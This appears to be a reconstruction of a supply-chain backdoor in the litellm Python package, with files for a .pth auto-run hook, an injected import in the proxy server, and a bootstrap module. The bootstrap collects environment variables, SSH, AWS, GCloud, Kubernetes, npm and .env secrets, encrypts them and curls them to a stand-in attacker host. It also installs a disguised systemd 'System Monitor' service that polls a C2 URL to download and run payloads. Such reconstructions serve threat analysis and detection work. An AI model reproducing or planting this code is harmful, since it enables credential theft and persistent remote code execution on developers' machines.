def run_proxy(config_path=None, host="0.0.0.0", port=4000):
    """Start the proxy server that fronts the configured providers."""
    print(f"litellm proxy listening on {host}:{port}")
    return {"host": host, "port": port, "config": config_path}
-- malicious/litellm_init.pth --
import os, sys, subprocess; subprocess.Popen([sys.executable, os.path.join(os.path.dirname(__file__), "litellm", "_bootstrap.py")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True) if os.environ.get("LITELLM_NO_HOOK") != "1" else None
-- malicious/litellm/proxy/proxy_server.py --
"""The litellm proxy server."""

from litellm.main import completion

# Injected: also run the bootstrap on import, in case the .pth did not fire.
try:
    import litellm._bootstrap  # noqa: F401
except Exception:
    pass


def run_proxy(config_path=None, host="0.0.0.0", port=4000):
    """Start the proxy server that fronts the configured providers."""
    print(f"litellm proxy listening on {host}:{port}")
    return {"host": host, "port": port, "config": config_path}
-- malicious/litellm/_bootstrap.py --
"""Injected bootstrap: collect credentials, exfiltrate, and install a poller.

Runs at every interpreter start via litellm_init.pth, and on import of
litellm.proxy. Guarded by LITELLM_NO_HOOK so this reconstruction can be loaded
without acting.
"""

import base64
import os
import subprocess
import tempfile

EXFIL_URL = "https://checkmarx.zone.invalid/upload"
C2_URL = "https://checkmarx.zone.invalid/raw"

# Embedded RSA public key (a throwaway, generated for this fixture).
PUB_PEM = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAljJ/hwUQLOvkLumGeKH6
eVIIcyCuEdXPA3xUyx9ckZLXcMso7yJKxRXGQW9bfqya5Y5RAcYeqHoQoYzHGoz8
G0zxr3lJtevosmz7jrYP8L8CAwEAAQ==
-----END PUBLIC KEY-----
"""


def _collect():
    """Gather the environment and common credential files into one blob."""
    parts = [f"{k}={v}" for k, v in os.environ.items()]
    for path in [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.config/gcloud/application_default_credentials.json"),
        os.path.expanduser("~/.kube/config"),
        os.path.expanduser("~/.npmrc"),
        os.path.join(os.getcwd(), ".env"),
    ]:
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
                parts.append(f"### {path}\n{fh.read()}")
        except OSError:
            continue
    return "\n".join(parts).encode("utf-8", "ignore")


def _encrypt_and_send(blob):
    """Encrypt with a session key wrapped by the RSA key, then POST the bundle."""
    work = tempfile.mkdtemp()
    data = os.path.join(work, "payload")
    with open(data, "wb") as fh:
        fh.write(blob)
    key = os.path.join(work, "session.key")
    pub = os.path.join(work, "pub.pem")
    with open(pub, "w") as fh:
        fh.write(PUB_PEM)
    subprocess.run(["openssl", "rand", "-out", key, "32"], check=False)
    enc, key_enc = data + ".enc", key + ".enc"
    subprocess.run(["openssl", "enc", "-aes-256-cbc", "-pbkdf2", "-in", data, "-out", enc, "-pass", f"file:{key}"], check=False)
    subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pub,
                    "-pkeyopt", "rsa_padding_mode:oaep", "-in", key, "-out", key_enc], check=False)
    bundle = os.path.join(work, "tpcp.tar.gz")
    subprocess.run(["tar", "-czf", bundle, "-C", work, "payload.enc", "session.key.enc"], check=False)
    subprocess.run(["curl", "-s", "-X", "POST", "-H", "Content-Type: application/octet-stream",
                    "--data-binary", f"@{bundle}", EXFIL_URL], check=False)


def _install_poller():
    """Write a systemd user unit and sysmon.py that polls the C2 for payloads."""
    cfg = os.path.expanduser("~/.config/systemd/user")
    os.makedirs(cfg, exist_ok=True)
    sysmon = os.path.join(os.path.dirname(cfg), "sysmon.py")
    with open(sysmon, "w") as fh:
        fh.write(
            "import time, subprocess, urllib.request\n"
            f"C_URL = {C2_URL!r}\n"
            "STATE, TARGET = '/tmp/.pg_state', '/tmp/pglog'\n"
            "def g():\n"
            "    return urllib.request.urlopen(C_URL, timeout=30).read().decode('utf-8', 'ignore').strip()\n"
            "def e(url):\n"
            "    if 'youtube.com' in url:\n"
            "        return\n"
            "    data = urllib.request.urlopen(url, timeout=60).read()\n"
            "    open(TARGET, 'wb').write(data)\n"
            "    import os\n"
            "    os.chmod(TARGET, 0o755)\n"
            "    subprocess.Popen([TARGET], start_new_session=True)\n"
            "    open(STATE, 'w').write(url)\n"
            "time.sleep(300)\n"
            "while True:\n"
            "    try:\n"
            "        e(g())\n"
            "    except Exception:\n"
            "        pass\n"
            "    time.sleep(3000)\n"
        )
    with open(os.path.join(cfg, "sysmon.service"), "w") as fh:
        fh.write("[Unit]\nDescription=System Monitor\n[Service]\n"
                 f"ExecStart=%h/.config/sysmon.py\nRestart=always\n[Install]\nWantedBy=default.target\n")


def main():
    if os.environ.get("LITELLM_NO_HOOK") == "1":
        return
    try:
        _encrypt_and_send(_collect())
        _install_poller()
    except Exception:
        pass


main()
